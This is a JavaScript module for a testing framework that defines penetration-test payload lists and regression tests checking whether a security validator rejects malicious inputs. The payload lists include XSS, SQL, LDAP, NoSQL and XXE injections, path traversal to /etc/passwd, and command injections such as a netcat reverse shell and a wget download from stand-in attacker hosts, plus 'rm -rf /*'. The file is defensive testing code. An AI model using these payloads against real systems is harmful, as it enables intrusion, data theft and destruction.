/**
 * Security Testing Framework
 *
 * Provides comprehensive security testing utilities, penetration
 * testing helpers, and automated security regression tests for
 * the qtests testing framework.
 */
import { securityMonitor } from './SecurityMonitor.js';
import { securityValidator } from './SecurityValidator.js';
import { securityPolicyManager } from './SecurityPolicyManager.js';
/**
 * Penetration testing utilities
 */
export class PenetrationTester {
    constructor() {
        this.payloads = {
            xss: [
                '<script>alert("xss")</script>',
                '<img src=x onerror=alert("xss")>',
                '<svg onload=alert("xss")>',
                'javascript:alert("xss")',
                '\"><script>alert("xss")</script>',
                '\'><script>alert("xss")</script>',
                '<script>document.location="http://evil.com"</script>'
            ],
            sqlInjection: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1'; UPDATE users SET password='hacked' WHERE '1'='1",
                "' OR 1=1 --",
                "admin'--",
                "' OR 'x'='x",
                "'; INSERT INTO users VALUES('hacker', 'password'); --"
            ],
            pathTraversal: [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc//passwd',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
                '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam'
            ],
            commandInjection: [
                '; ls -la',
                '| cat /etc/passwd',
                '& echo "hacked"',
                '`whoami`',
                '$(id)',
                '; rm -rf /*',
                '| nc attacker.com 4444 -e /bin/sh',
                '& wget http://evil.com/shell.sh'
            ],
            ldapInjection: [
                '*)(&',
                '*)(|(objectClass=*)',
                '*)(|(password=*))',
                '*)(|(uid=*))',
                '*)%00',
                '*(|(objectClass=*))',
                '*)(|(objectClass=*))',
                '*)(|(userPassword=*))'
            ],
            xmlInjection: [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>'
            ],
            nosqlInjection: [
                '{"$gt":""}',
                '{"$ne":""}',
                '{"$regex":".*"}',
                '{"$where":"this.username == \'admin\'"}',
                '{"$or":[{"username":"admin"},{"password":"admin"}]}',
                'db.users.find({$where: "this.username == \'admin\'"})',
                '{"$expr":{"$eq":[{"$str":"$username"},"admin"]}}',
                'db.users.find({$jsonSchema:{$eq: {required: ["username"]}}})'
            ]
        };
    }
    /**
     * Test XSS vulnerabilities
     */
    testXSS(input, sanitize = true) {
        const startTime = Date.now();
        const vulnerabilities = [];
        const recommendations = [];
        // Test XSS payloads
        for (const payload of this.payloads.xss) {
            let testInput = input.replace('{{payload}}', payload);
            if (sanitize) {
                const result = securityValidator.sanitize(testInput, {
                    removeHtml: true,
                    removeScriptTags: true,
                    escapeHtml: true
                });
                testInput = result;
            }
            // Check if payload is still active
            if (testInput.includes('<script') || testInput.includes('javascript:') || testInput.includes('onerror=')) {
                vulnerabilities.push(`XSS payload not sanitized: ${payload}`);
            }
        }
        // Add recommendations
        if (vulnerabilities.length > 0) {
            recommendations.push('Implement proper HTML sanitization');
            recommendations.push('Use Content Security Policy headers');
            recommendations.push('Escape all user-provided content');
        }
        return {
            passed: vulnerabilities.length === 0,
            description: 'XSS vulnerability test',
            details: `Tested ${this.payloads.xss.length} XSS payloads`,
            vulnerabilities,
            recommendations,
            executionTime: Date.now() - startTime
        };
    }
    /**
     * Test SQL injection vulnerabilities
     */
    testSQLInjection(query, parametrize = true) {
        const startTime = Date.now();
        const vulnerabilities = [];
        const recommendations = [];
        // Test SQL injection payloads
        for (const payload of this.payloads.sqlInjection) {
            let testQuery = query.replace('{{param}}', payload);
            // Check for SQL keywords in the final query
            const sqlKeywords = ['DROP', 'UNION', 'SELECT', 'UPDATE', 'DELETE', 'INSERT', 'WHERE', 'OR'];
            for (const keyword of sqlKeywords) {
                if (testQuery.toUpperCase().includes(keyword) && !parametrize) {
                    vulnerabilities.push(`SQL injection payload detected: ${payload}`);
                    break;
                }
            }
        }
        // Add recommendations
        if (vulnerabilities.length > 0) {
            recommendations.push('Use parameterized queries');
            recommendations.push('Implement input validation');
            recommendations.push('Use ORM frameworks with built-in protection');
        }
        return {
            passed: vulnerabilities.length === 0,
            description: 'SQL injection vulnerability test',
            details: `Tested ${this.payloads.sqlInjection.length} SQL injection payloads`,
            vulnerabilities,
            recommendations,
            executionTime: Date.now() - startTime
        };
    }
    /**
     * Test path traversal vulnerabilities
     */
    testPathTraversal(path, validate = true) {
        const startTime = Date.now();
        const vulnerabilities = [];
        const recommendations = [];
        // Test path traversal payloads
        for (const payload of this.payloads.pathTraversal) {
            let testPath = path.replace('{{path}}', payload);
            if (validate) {
                const result = securityValidator.validatePath(testPath);
                if (!result.valid) {
                    // Good - validation caught the issue
                    continue;
                }
                testPath = result.sanitized || testPath;
            }
            // Check if traversal is still possible
            if (testPath.includes('../') || testPath.includes('..\\')) {
                vulnerabilities.push(`Path traversal not prevented: ${payload}`);
            }
        }
        // Add recommendations
        if (vulnerabilities.length > 0) {
            recommendations.push('Validate and normalize all file paths');
            recommendations.push('Use chroot or file system sandboxing');
            recommendations.push('Implement allowlisting for file access');
        }
        return {
            passed: vulnerabilities.length === 0,
            description: 'Path traversal vulnerability test',
            details: `Tested ${this.payloads.pathTraversal.length} path traversal payloads`,
            vulnerabilities,
            recommendations,
            executionTime: Date.now() - startTime
        };
    }
    /**
     * Test command injection vulnerabilities
     */
    testCommandInjection(command, validate = true) {
        const startTime = Date.now();
        const vulnerabilities = [];
        const recommendations = [];
        // Test command injection payloads
        for (const payload of this.payloads.commandInjection) {
            let testCommand = command.replace('{{arg}}', payload);
            if (validate) {
                const result = securityValidator.validateCommand(testCommand.split(' ')[0]);
                if (!result.valid) {
                    // Good - validation caught the issue
                    continue;
                }
            }
            // Check for dangerous characters
            if (/[;&|`$(){}\[\]]/.test(testCommand)) {
                vulnerabilities.push(`Command injection not prevented: ${payload}`);
            }
        }
        // Add recommendations
        if (vulnerabilities.length > 0) {
            recommendations.push('Use command allowlisting');
            recommendations.push('Never concatenate user input with commands');
            recommendations.push('Use parameterized command execution');
        }
        return {
            passed: vulnerabilities.length === 0,
            description: 'Command injection vulnerability test',
            details: `Tested ${this.payloads.commandInjection.length} command injection payloads`,
            vulnerabilities,
            recommendations,
            executionTime: Date.now() - startTime
        };
    }
    /**
     * Run comprehensive penetration test
     */
    runPenetrationTest(target) {
        const results = [];
        if (target.inputEndpoint) {
            results.push(this.testXSS(target.inputEndpoint));
            results.push(this.testPathTraversal(target.inputEndpoint));
        }
        if (target.queryEndpoint) {
            results.push(this.testSQLInjection(target.queryEndpoint));
        }
        if (target.pathEndpoint) {
            results.push(this.testPathTraversal(target.pathEndpoint));
        }
        if (target.commandEndpoint) {
            results.push(this.testCommandInjection(target.commandEndpoint));
        }
        return results;
    }
}
/**
 * Automated security regression test suite
 */
export class SecurityRegressionTester {
    constructor() {
        this.testCases = [
            {
                name: 'module-id-validation',
                description: 'Test module ID validation prevents injection',
                category: 'input_validation',
                severity: 'high',
                test: () => {
                    const maliciousIds = [
                        '../../../etc/passwd',
                        'module;rm -rf /',
                        'module`whoami`',
                        'module|cat /etc/passwd',
                        '<script>alert("xss")</script>'
                    ];
                    const vulnerabilities = [];
                    for (const moduleId of maliciousIds) {
                        const result = securityValidator.validateModuleId(moduleId);
                        if (result.valid) {
                            vulnerabilities.push(`Malicious module ID not rejected: ${moduleId}`);
                        }
                    }
                    return {
                        passed: vulnerabilities.length === 0,
                        description: 'Module ID validation test',
                        details: `Tested ${maliciousIds.length} malicious module IDs`,
                        vulnerabilities,
                        recommendations: vulnerabilities.length > 0 ? ['Strengthen module ID validation'] : [],
                        executionTime: 0
                    };
                }
            },
            {
                name: 'file-path-security',
                description: 'Test file path validation prevents traversal',
                category: 'input_validation',
                severity: 'high',
                test: () => {
                    const maliciousPaths = [
                        '../../../etc/passwd',
                        '..\\..\\..\\windows\\system32\\config\\sam',
                        'normal/path/../../../etc/passwd',
                        '/etc/passwd',
                        'C:\\Windows\\System32\\config\\sam'
                    ];
                    const vulnerabilities = [];
                    for (const path of maliciousPaths) {
                        const result = securityValidator.validatePath(path);
                        if (result.valid) {
                            vulnerabilities.push(`Malicious path not rejected: ${path}`);
                        }
                    }
                    return {
                        passed: vulnerabilities.length === 0,
                        description: 'File path security test',
                        details: `Tested ${maliciousPaths.length} malicious paths`,
                        vulnerabilities,
                        recommendations: vulnerabilities.length > 0 ? ['Strengthen path validation'] : [],
                        executionTime: 0
                    };
                }
            },
            {
                name: 'json-injection-security',
                description: 'Test JSON injection prevention',
                category: 'injection',
                severity: 'medium',
                test: () => {
                    const maliciousJSON = [
                        '{"__proto__":{"isAdmin":true}}',
                        '{"constructor":{"prototype":{"isAdmin":true}}}',
                        '{"$where":"this.username == \\"admin\\""}',
                        '<script>alert("xss")</script>',
                        ';" DROP TABLE users; --'
                    ];
                    const vulnerabilities = [];
                    for (const json of maliciousJSON) {
                        const result = securityValidator.validateJSON(json);
                        if (result.valid) {
                            vulnerabilities.push(`Malicious JSON not rejected: ${json}`);
                        }
                    }
                    return {
                        passed: vulnerabilities.length === 0,
                        description: 'JSON injection security test',
                        details: `Tested ${maliciousJSON.length} malicious JSON strings`,
                        vulnerabilities,
                        recommendations: vulnerabilities.length > 0 ? ['Strengthen JSON validation'] : [],
                        executionTime: 0
                    };
                }
            },
            {
                name: 'security-headers-check',
                description: 'Test security headers are properly configured',
                category: 'configuration',
                severity: 'medium',
                test: () => {
                    const headers = securityPolicyManager.generateSecurityHeaders();
                    const validation = securityPolicyManager.validateSecurityHeaders(headers);
                    return {
                        passed: validation.valid,
                        description: 'Security headers configuration test',
                        details: `Validated ${Object.keys(headers).length} security headers`,
                        vulnerabilities: validation.errors,
                        recommendations: validation.errors.length > 0 ? ['Fix missing security headers'] : [],
                        executionTime: 0
                    };
                }
            },
            {
                name: 'rate-limiting-test',
                description: 'Test rate limiting prevents abuse',
                category: 'authentication',
                severity: 'medium',
                test: () => {
                    const identifier = 'test-rate-limit';
                    // Clear any existing rate limits
                    securityMonitor.checkRateLimit(identifier, { windowMs: 100, maxRequests: 2 });
                    // Make requests up to limit
                    const result1 = securityMonitor.checkRateLimit(identifier);
                    const result2 = securityMonitor.checkRateLimit(identifier);
                    const result3 = securityMonitor.checkRateLimit(identifier); // Should be blocked
                    const vulnerabilities = [];
                    if (!result1.allowed) {
                        vulnerabilities.push('First request should be allowed');
                    }
                    if (!result2.allowed) {
                        vulnerabilities.push('Second request should be allowed');
                    }
                    if (result3.allowed) {
                        vulnerabilities.push('Third request should be blocked (rate limit exceeded)');
                    }
                    return {
                        passed: vulnerabilities.length === 0,
                        description: 'Rate limiting test',
                        details: 'Tested rate limiting functionality',
                        vulnerabilities,
                        recommendations: vulnerabilities.length > 0 ? ['Fix rate limiting implementation'] : [],
                        executionTime: 0
                    };
                }
            }
        ];
    }
    /**
     * Run all security regression tests
     */
    runAllTests() {
        return this.testCases.map(testCase => {
            try {
                return testCase.test();
            }
            catch (error) {
                return {
                    passed: false,
                    description: testCase.description,
                    details: `Test execution failed: ${error}`,
                    vulnerabilities: ['Test execution error'],
                    recommendations: ['Fix test implementation'],
                    executionTime: 0
                };
            }
        });
    }
    /**
     * Run tests by category
     */
    runTestsByCategory(category) {
        const filteredTests = this.testCases.filter(test => test.category === category);
        return filteredTests.map(testCase => testCase.test());
    }
    /**
     * Generate security test report
     */
    generateReport(results) {
        const totalTests = results.length;
        const passedTests = results.filter(result => result.passed).length;
        const failedTests = totalTests - passedTests;
        const totalVulnerabilities = results.reduce((sum, result) => sum + result.vulnerabilities.length, 0);
        const report = [
            '# Security Regression Test Report',
            `Generated: ${new Date().toISOString()}`,
            '',
            '## Summary',
            `- Total Tests: ${totalTests}`,
            `- Passed: ${passedTests}`,
            `- Failed: ${failedTests}`,
            `- Total Vulnerabilities: ${totalVulnerabilities}`,
            `- Success Rate: ${((passedTests / totalTests) * 100).toFixed(1)}%`,
            '',
            '## Test Results',
            ...results.map(result => [
                `### ${result.description}`,
                `- Status: ${result.passed ? '✅ PASSED' : '❌ FAILED'}`,
                `- Details: ${result.details}`,
                result.vulnerabilities.length > 0 ? `- Vulnerabilities: ${result.vulnerabilities.join(', ')}` : '',
                result.recommendations.length > 0 ? `- Recommendations: ${result.recommendations.join(', ')}` : '',
                ''
            ]).flat(),
            '',
            '## Recommendations Summary',
            this.generateRecommendations(results),
            '',
            '--- End of Report ---'
        ];
        return report.join('\n');
    }
    /**
     * Generate consolidated recommendations
     */
    generateRecommendations(results) {
        const allRecommendations = new Set();
        results.forEach(result => {
            result.recommendations.forEach(rec => allRecommendations.add(rec));
        });
        return Array.from(allRecommendations);
    }
}
// Global instances
export const penetrationTester = new PenetrationTester();
export const securityRegressionTester = new SecurityRegressionTester();
/**
 * Convenience function to run full security test suite
 */
export function runFullSecurityTest() {
    return securityRegressionTester.runAllTests();
}
/**
 * Convenience function to generate security test report
 */
export function generateSecurityTestReport(results) {
    const testResults = results || runFullSecurityTest();
    return securityRegressionTester.generateReport(testResults);
}
